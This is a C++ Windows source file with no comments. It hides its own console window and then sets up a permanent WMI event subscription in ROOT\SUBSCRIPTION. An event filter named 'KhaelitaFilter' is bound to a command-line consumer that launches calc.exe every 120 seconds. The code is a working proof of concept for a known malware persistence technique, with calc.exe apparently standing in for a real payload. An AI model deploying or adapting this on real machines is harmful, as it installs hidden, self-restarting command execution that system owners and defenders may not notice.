#define _WIN32_DCOM
#include <windows.h>
#include <iostream>
#include <comdef.h>
#include <Wbemidl.h>

#pragma comment(lib, "wbemuuid.lib")

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    HRESULT hr;
    IWbemLocator* pLoc = NULL;
    IWbemServices* pSvc = NULL;

    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr)) return 0;

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hr)) { CoUninitialize(); return 0; }

    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr)) { CoUninitialize(); return 0; }

    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\SUBSCRIPTION"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hr)) { pLoc->Release(); CoUninitialize(); return 0; }

    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    IWbemClassObject* pFilterClass = NULL;
    pSvc->GetObject(_bstr_t(L"__EventFilter"), 0, NULL, &pFilterClass, NULL);
    IWbemClassObject* pFilterInst = NULL;
    pFilterClass->SpawnInstance(0, &pFilterInst);

    _variant_t vtFilterName(L"KhaelitaFilter");
    _variant_t vtQueryLang(L"WQL");
    _variant_t vtQuery(L"SELECT * FROM __InstanceModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_LocalTime'");
    _variant_t vtNamespace(L"root\\cimv2");

    pFilterInst->Put(L"Name", 0, &vtFilterName, 0);
    pFilterInst->Put(L"QueryLanguage", 0, &vtQueryLang, 0);
    pFilterInst->Put(L"Query", 0, &vtQuery, 0);
    pFilterInst->Put(L"EventNamespace", 0, &vtNamespace, 0);

    pSvc->PutInstance(pFilterInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    IWbemClassObject* pConsumerClass = NULL;
    pSvc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0, NULL, &pConsumerClass, NULL);
    IWbemClassObject* pConsumerInst = NULL;
    pConsumerClass->SpawnInstance(0, &pConsumerInst);

    _variant_t vtConsumerName(L"KhaelitaConsumer");
    _variant_t vtCommandLine(L"C:\\Windows\\System32\\calc.exe");

    pConsumerInst->Put(L"Name", 0, &vtConsumerName, 0);
    pConsumerInst->Put(L"CommandLineTemplate", 0, &vtCommandLine, 0);

    pSvc->PutInstance(pConsumerInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    IWbemClassObject* pBindingClass = NULL;
    pSvc->GetObject(_bstr_t(L"__FilterToConsumerBinding"), 0, NULL, &pBindingClass, NULL);
    IWbemClassObject* pBindingInst = NULL;
    pBindingClass->SpawnInstance(0, &pBindingInst);

    _variant_t vtFilterPath(L"__EventFilter.Name=\"KhaelitaFilter\"");
    _variant_t vtConsumerPath(L"CommandLineEventConsumer.Name=\"KhaelitaConsumer\"");

    pBindingInst->Put(L"Filter", 0, &vtFilterPath, 0);
    pBindingInst->Put(L"Consumer", 0, &vtConsumerPath, 0);

    pSvc->PutInstance(pBindingInst, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);

    pFilterInst->Release();
    pFilterClass->Release();
    pConsumerInst->Release();
    pConsumerClass->Release();
    pBindingInst->Release();
    pBindingClass->Release();
    pSvc->Release();
    pLoc->Release();
    CoUninitialize();

    return 0;
}